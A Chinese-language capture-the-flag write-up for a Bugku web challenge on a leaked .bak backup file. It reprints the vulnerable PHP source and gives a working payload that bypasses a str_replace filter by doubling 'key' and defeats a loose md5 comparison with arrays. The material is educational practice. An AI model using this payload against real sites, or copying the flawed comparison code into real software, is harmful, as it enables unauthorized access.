Bugku Web｜备份是个好习惯

分类：Web  |  分值：20  |  考点：备份文件泄露、str_replace删除绕过、MD5数组绕过

题目描述

访问给出的Web链接，页面无内容，提示备份。

解题思路

  1. 根据提示备份，访问备份文件 index.php.bak，下载得到PHP源代码。
  2. 源码使用 str_replace('key','',$str)，会把URL参数中的key全部删除。
  3. 需要同时满足：md5($key1) == md5($key2) 弱相等，并且 $key1 !== $key2强不相等。
  4. PHP对数组做md5会返回null，null==null成立；两个不同数组强比较为false。
  5. 构造参数：kekeyy1[]=a&kekeyy2[]=b，str_replace删除key字符串后，参数变为key1[]=a&key2[]=b，成功绕过过滤。

源码

$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);
echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag;
}

Payload

?kekeyy1[]=a&kekeyy2[]=b
⚠️ 关键点：不能直接写key1，会被str_replace把key删掉；使用双写key（kekeyy1）的方式绕过字符串删除。

知识点总结

  • .bak备份文件泄露，编辑器自动备份产生源码泄露
  • str_replace字符串删除，双写字符绕过
  • PHP md5处理数组返回NULL，利用数组完成弱相等、强不等双重条件
